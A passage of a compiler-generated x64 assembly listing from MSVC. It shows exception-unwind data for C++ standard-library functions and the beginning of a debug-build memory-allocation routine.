	DD	0700c001dH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?deallocate@?$allocator@_W@std@@QEAAXQEA_W_K@Z DD 025051d01H
	DD	0118231dH
	DD	07011001dH
	DD	05010H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$allocator@_W@std@@QEAA@XZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Xlen_string@std@@YAXXZ DD 025050f01H
	DD	010a230fH
	DD	07003001dH
	DD	05002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?assign@?$_WChar_traits@_W@std@@SAXAEA_WAEB_W@Z DD 025051801H
	DD	01132318H
	DD	0700c001dH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?length@?$_WChar_traits@_W@std@@SA_KPEB_W@Z DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?move@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z DD 025051d01H
	DD	0118231dH
	DD	07011001dH
	DD	05010H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?copy@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z DD 025051d01H
	DD	0118231dH
	DD	07011001dH
	DD	05010H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Release@_Fake_proxy_ptr_impl@std@@QEAAXXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0_Fake_proxy_ptr_impl@std@@QEAA@AEBU_Fake_allocator@1@AEBU_Container_base0@1@@Z DD 025051d01H
	DD	0118231dH
	DD	07011001dH
	DD	05010H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Alloc_proxy@_Container_base0@std@@QEAAXAEBU_Fake_allocator@2@@Z DD 025051801H
	DD	01132318H
	DD	0700c001dH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Swap_proxy_and_iterators@_Container_base0@std@@QEAAXAEAU12@@Z DD 025051801H
	DD	01132318H
	DD	0700c001dH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Orphan_all@_Container_base0@std@@QEAAXXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Adjust_manually_vector_aligned@std@@YAXAEAPEAXAEA_K@Z DD 025051801H
	DD	01132318H
	DD	0700c002dH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Allocate@_Default_allocate_traits@std@@SAPEAX_K@Z DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Throw_bad_array_new_length@std@@YAXXZ DD 025050f01H
	DD	010a230fH
	DD	070030023H
	DD	05002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??_Gbad_array_new_length@std@@UEAAPEAXI@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0bad_array_new_length@std@@QEAA@AEBV01@@Z DD 025051801H
	DD	01132318H
	DD	0700c001dH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1bad_array_new_length@std@@UEAA@XZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0bad_array_new_length@std@@QEAA@XZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??_Gbad_alloc@std@@UEAAPEAXI@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0bad_alloc@std@@QEAA@AEBV01@@Z DD 025051801H
	DD	01132318H
	DD	0700c001dH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1bad_alloc@std@@UEAA@XZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0bad_alloc@std@@AEAA@QEBD@Z DD 025051801H
	DD	01132318H
	DD	0700c001dH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??_Gexception@std@@UEAAPEAXI@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?what@exception@std@@UEBAPEBDXZ DD 025051301H
	DD	010e2313H
	DD	07007001fH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1exception@std@@UEAA@XZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0exception@std@@QEAA@AEBV01@@Z DD 025051801H
	DD	01132318H
	DD	0700c001dH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0exception@std@@QEAA@QEBDH@Z DD 025051d01H
	DD	0118231dH
	DD	07011001dH
	DD	05010H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?max@?$numeric_limits@_J@std@@SA_JXZ DD 025050f01H
	DD	010a230fH
	DD	07003001dH
	DD	05002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??2@YAPEAX_KPEAX@Z DD 025051801H
	DD	01132318H
	DD	0700c001dH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$RtlSecureZeroMemory DD 025051801H
	DD	01132318H
	DD	0700c0021H
	DD	0500bH
xdata	ENDS
; Function compile flags: /Odt
;	COMDAT __JustMyCode_Default
_TEXT	SEGMENT
__JustMyCode_Default PROC				; COMDAT
  00000	c2 00 00	 ret	 0
__JustMyCode_Default ENDP
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??$_Allocate_manually_vector_aligned@U_Default_allocate_traits@std@@@std@@YAPEAX_K@Z
_TEXT	SEGMENT
_Block_size$ = 8
_Ptr_container$ = 40
_Ptr$ = 72
_Bytes$ = 320
??$_Allocate_manually_vector_aligned@U_Default_allocate_traits@std@@@std@@YAPEAX_K@Z PROC ; std::_Allocate_manually_vector_aligned<std::_Default_allocate_traits>, COMDAT

; 140  : __declspec(allocator) void* _Allocate_manually_vector_aligned(const size_t _Bytes) {

$LN12:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 48 01
	00 00		 sub	 rsp, 328		; 00000148H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

